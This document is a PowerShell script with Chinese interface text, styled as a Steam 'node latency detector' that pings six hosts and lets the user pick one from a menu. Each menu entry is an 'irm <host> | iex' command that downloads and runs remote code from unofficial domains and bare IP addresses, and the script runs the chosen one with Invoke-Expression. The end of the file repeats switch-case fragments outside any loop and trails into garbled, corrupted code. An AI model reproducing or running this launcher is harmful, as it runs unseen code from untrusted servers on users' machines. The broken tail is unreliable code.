# ============================================================
# Steam 节点延迟检测 & 交互式选择器
# ============================================================

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

$nodes = @(
    [PSCustomObject]@{ Label = "steam-run.com"; Host = "8.45.176.226"; Cmd = "irm steam-run.com | iex" },
    [PSCustomObject]@{ Label = "1.steam-run.com"; Host = "121.41.70.40"; Cmd = "irm 1.steam-run.com | iex" },
    [PSCustomObject]@{ Label = "2.steam-run.com"; Host = "121.41.70.40"; Cmd = "irm 2.steam-run.com | iex" },
    [PSCustomObject]@{ Label = "steamcdkey.cn"; Host = "47.98.202.172"; Cmd = "irm steamcdkey.cn | iex" },
    [PSCustomObject]@{ Label = "142785900"; Host = "8.130.189.108"; Cmd = "irm 8.130.189.108 | iex" },
    [PSCustomObject]@{ Label = "2526944756"; Host = "150.158.153.244"; Cmd = "irm 150.158.153.244 | iex" }
)

$PING_COUNT = 3
$PING_TIMEOUT = 2000
$BAR_MAX = 14

function wc {
    param([string]$Text, [string]$FG = "White", [string]$BG = "", [switch]$NL)
    $p = @{ Object = $Text; ForegroundColor = $FG; NoNewline = $NL.IsPresent }
    if ($BG -ne "") { $p["BackgroundColor"] = $BG }
    Write-Host @p
}

function Measure-Latency {
    param([string]$HostAddr, [int]$Count, [int]$Timeout)
    $times = @()
    for ($i = 0; $i -lt $Count; $i++) {
        try {
            $ping = New-Object System.Net.NetworkInformation.Ping
            $result = $ping.Send($HostAddr, $Timeout)
            if ($result.Status -eq "Success") { $times += $result.RoundtripTime }
        }
        catch { }
    }
    if ($times.Count -eq 0) { return -1 }
    return [int](($times | Measure-Object -Average).Average)
}

function Draw-Header {
    $I = 68
    wc ("  " + [char]0x256D + ("─" * $I) + [char]0x256E) "DarkCyan"
    wc "  |" "DarkCyan" -NL; wc "  ◈  " "Cyan" -NL; wc "Steam" "White" -NL
    wc " 节点延迟检测  " "Cyan" -NL; wc (" " * ($I - 17) + "|") "DarkCyan"
    wc "  |" "DarkCyan" -NL
    wc ("    交互式节点选择器  ·  自动选中最优节点" + " " * ($I - 42) + "|") "DarkGray"
    wc ("  " + [char]0x251C + ("─" * $I) + [char]0x2524) "DarkCyan"
    wc "  |" "DarkCyan" -NL
    wc ("  {0,-20} {1,-16} {2,-8} {3}" -f "节点", "IP 地址", "延迟", "质量") "DarkGray" -NL
    wc (" " * ($I - 50) + "|") "DarkCyan"
    wc ("  " + [char]0x251C + ("─" * $I) + [char]0x2524) "DarkCyan"
}

function Draw-Footer {
    $I = 68
    wc ("  " + [char]0x251C + ("─" * $I) + [char]0x2524) "DarkCyan"
    wc "  |  " "DarkCyan" -NL; wc " ↑↓ " "Cyan" -NL; wc "选择  " "DarkGray" -NL
    wc "Enter " "Green" -NL; wc "执行  " "DarkGray" -NL; wc "Esc " "Yellow" -NL
    wc ("退出" + " " * ($I - 26) + "|") "DarkGray"
    wc ("  " + [char]0x2570 + ("─" * $I) + [char]0x256F) "DarkCyan"
}

function Draw-Row {
    param([int]$Index, [int]$Selected, [int]$BestIndex, [array]$Latencies)
    $I = 68
    $n = $nodes[$Index]
    $lat = $Latencies[$Index]
    if ($lat -eq -2) { $latTxt = "--"; $latC = "DarkGray" }
    elseif ($lat -eq -1) { $latTxt = "超时"; $latC = "DarkGray" }
    elseif ($lat -lt 60) { $latTxt = "$lat ms"; $latC = "Green" }
    elseif ($lat -lt 150) { $latTxt = "$lat ms"; $latC = "Yellow" }
    else { $latTxt = "$lat ms"; $latC = "Red" }
    $bar = ""
    if ($lat -gt 0) {
        $maxLat = ($Latencies | Where-Object { $_ -gt 0 } | Measure-Object -Maximum).Maximum
        if ($null -ne $maxLat -and $maxLat -gt 0) {
            $filled = [int]([Math]::Round(($lat / $maxLat) * $BAR_MAX))
            $bar = ("█" * $filled) + ("░" * ($BAR_MAX - $filled))
        }
    }
    elseif ($lat -eq -2) { $bar = "░" * $BAR_MAX }
    $isSel = ($Index -eq $Selected)
    $isBest = ($Index -eq $BestIndex) -and ($lat -gt 0)
    if ($isSel) { $icon = " >"; $iconC = "Cyan" }
    elseif ($isBest) { $icon = " *"; $iconC = "Green" }
    else { $icon = "  "; $iconC = "DarkGray" }
    $nameC = if ($isSel) { "White" } elseif ($isBest) { "Green" } else { "Gray" }
    $BG = if ($isSel) { "DarkBlue" } else { "" }
    $rest = $I - 2 - 21 - 17 - 9 - 1 - $BAR_MAX
    $pad = " " * [Math]::Max(0, $rest)
    wc "  |" "DarkCyan" -NL
    wc $icon $iconC $BG -NL
    wc (" {0,-20}" -f $n.Label) $nameC $BG -NL
    wc (" {0,-16}" -f $n.Host)  "DarkGray" $BG -NL
    wc (" {0,-8}" -f $latTxt)   $latC $BG -NL
    wc " $bar$pad" $latC $BG -NL
    wc "|" "DarkCyan"
}

function Redraw-Rows {
    param([int]$Selected, [int]$BestIndex, [array]$Latencies, [int]$StartY)
    $cur = $Host.UI.RawUI.CursorPosition
    $cur.Y = $StartY
    $Host.UI.RawUI.CursorPosition = $cur
    for ($i = 0; $i -lt $nodes.Count; $i++) {
        Draw-Row -Index $i -Selected $Selected -BestIndex $BestIndex -Latencies $Latencies
    }
}

Clear-Host
$Host.UI.RawUI.WindowTitle = "Steam 节点选择器"
Draw-Header
$rowsStartY = $Host.UI.RawUI.CursorPosition.Y
$latencies = @(-2) * $nodes.Count
for ($i = 0; $i -lt $nodes.Count; $i++) { Draw-Row -Index $i -Selected 0 -BestIndex -1 -Latencies $latencies }
Draw-Footer
Write-Host ""
wc "  正在测量节点延迟，请稍候..." "DarkCyan"
$bestIndex = -1; $bestLat = [int]::MaxValue
for ($i = 0; $i -lt $nodes.Count; $i++) {
    $lat = Measure-Latency -HostAddr $nodes[$i].Host -Count $PING_COUNT -Timeout $PING_TIMEOUT
    $latencies[$i] = $lat
    if ($lat -gt 0 -and $lat -lt $bestLat) { $bestLat = $lat; $bestIndex = $i }
    Redraw-Rows -Selected 0 -BestIndex $bestIndex -Latencies $latencies -StartY $rowsStartY
}
$selected = if ($bestIndex -ge 0) { $bestIndex } else { 0 }
Clear-Host
Draw-Header
$rowsStartY = $Host.UI.RawUI.CursorPosition.Y
for ($i = 0; $i -lt $nodes.Count; $i++) { Draw-Row -Index $i -Selected $selected -BestIndex $bestIndex -Latencies $latencies }
Draw-Footer
Write-Host ""
if ($bestIndex -ge 0) {
    wc "  * 最优节点 " "DarkGray" -NL; wc $nodes[$bestIndex].Label "Cyan" -NL
    wc "  延迟 " "DarkGray" -NL; wc "$bestLat ms" "Green"
}
else {
    wc "  ! 所有节点均无法连接，请检查网络" "Red"
}
Write-Host ""

while ($true) {
    $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    switch ($key.VirtualKeyCode) {
        38 {
            $selected = if ($selected -gt 0) { $selected - 1 } else { $nodes.Count - 1 }
            Redraw-Rows -Selected $selected -BestIndex $bestIndex -Latencies $latencies -StartY $rowsStartY
        }
        40 {
            $selected = if ($selected -lt ($nodes.Count - 1)) { $selected + 1 } else { 0 }
            Redraw-Rows -Selected $selected -BestIndex $bestIndex -Latencies $latencies -StartY $rowsStartY
        }
        13 {
            $chosen = $nodes[$selected]
            $pos = $Host.UI.RawUI.CursorPosition
            $pos.Y = $rowsStartY + $nodes.Count + 5
            $Host.UI.RawUI.CursorPosition = $pos
            Write-Host ""
            wc "  +-- 执行 -----------------------------------------------+" "DarkCyan"
            wc "  |  " "DarkCyan" -NL; wc ("> " + $chosen.Cmd) "Cyan"
            wc "  |  " "DarkCyan" -NL; wc ("节点: " + $chosen.Label) "DarkGray"
            wc "  +-------------------------------------------------------+" "DarkCyan"
            Write-Host ""
            try { Invoke-Expression $chosen.Cmd }
            catch { wc ("  ! 执行失败: " + $_) "Red" }
            break
        }
        27 {
            $pos = $Host.UI.RawUI.CursorPosition
            $pos.Y = $rowsStartY + $nodes.Count + 5
            $Host.UI.RawUI.CursorPosition = $pos
            Write-Host ""; wc "  -- 已退出" "DarkGray"; Write-Host ""
            break
        }
    }
    if ($key.VirtualKeyCode -eq 13 -or $key.VirtualKeyCode -eq 27) { break }
}    
13 {
    # Enter
    $chosenCmd = $nodes[$selected].Cmd
    $chosenLbl = $nodes[$selected].Label.TrimEnd()
    # 移到底部再输出
    $pos = $Host.UI.RawUI.CursorPosition
    $pos.Y = $rowsStartY + $nodes.Count + 5
    $Host.UI.RawUI.CursorPosition = $pos
    Write-Host ""
    Write-Host "  ▶ 正在执行: $chosenCmd" -ForegroundColor $C_HINT
    Write-Host "  节点: $chosenLbl" -ForegroundColor "Gray"
    Write-Host ""
    try {
        Invoke-Expression $chosenCmd
    }
    catch {
        Write-Host "  ✗ 执行失败: $_" -ForegroundColor "Red"
    }
    break
}
27 {
    # ESC
    $pos = $Host.UI.RawUI.CursorPosition
    $pos.Y = $rowsStartY + $nodes.Count + 5
    13 {
        # Enter
        $chosenCmd = $nodes[$selected].Cmd
        $chodf ($key.V y.V$rtualKedqode -eqn13 orEn$key.VirtualKe { odeq-eq27ebS $reEhElC
            }